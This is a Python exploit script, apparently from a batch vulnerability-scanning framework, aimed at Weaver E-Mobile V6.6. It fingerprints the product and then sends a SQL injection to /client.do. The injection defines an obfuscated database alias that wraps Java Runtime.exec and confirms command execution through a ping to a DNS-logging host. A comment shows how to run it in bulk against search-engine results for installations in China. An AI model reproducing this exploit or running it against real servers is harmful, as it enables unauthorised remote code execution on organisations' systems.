# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from core.utils.dnslog import eyes_dnslog_verify, get_eyes_identifier
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# app="泛微-EMobile" && country="CN"
# python3 batch.py -m exploit.scripts.OA.Weaver.E-Mobile.unauth_client_do_database_rce -cs -fs "app=\"泛微-EMobile\" && country=\"CN\""
# ok


class Script(BaseScript):
    name = 'E-Mobile'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = 'https://forum.butian.net/share/84'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/client.do']
        # priority
        self.priority = 1
        # 相关信息
        self.info = 'version == V6.6'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and ('content="weaver e-mobile"' in text or 'window.apiprifix = "/emp";' in text or ('/images/login_logo@2x.png' in text and 'action="/verifylogin.do' in text) or ('e-mobile' in text and 'weaver' in text)):
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Connection': "close", 'Accept-Encoding': "gzip, deflate", 'Accept': "*/*", 'Content-Type': "application/x-www-form-urlencoded"})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                verify_random_int = random.randint(10000, 99999)
                data1 = '''method=getupload&uploadID=1';CREATE ALIAS cs{}'''.format(verify_random_int)
                data2 = ''' AS CONCAT('void e(String cmd) throws java.io.IOException{','java.lan','g.Run','time rt=java.la','ng.Ru','ntime.getRu','ntime();rt.ex','ec(cmd);}');'''
                data3 = '''CALL cs{}('ping {}.{}');select+'1 '''.format(verify_random_int, verify_random_int, get_eyes_identifier())
                await AsyncFetcher.post_fetch(session=session, url=url, data=data1+data2+data3, headers=headers, timeout=self.req_timeout)
                await asyncio.sleep(2)
                text = await eyes_dnslog_verify('dns', verify_random_int)
                if text is not None and text:
                    gLogger.myscan_info('[{} {} Verify:{}] {}'.format(self.name, self.bug_type, verify_random_int, url))
                    return {'name': '{} Client.do - Verify:{}'.format(self.name, verify_random_int), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
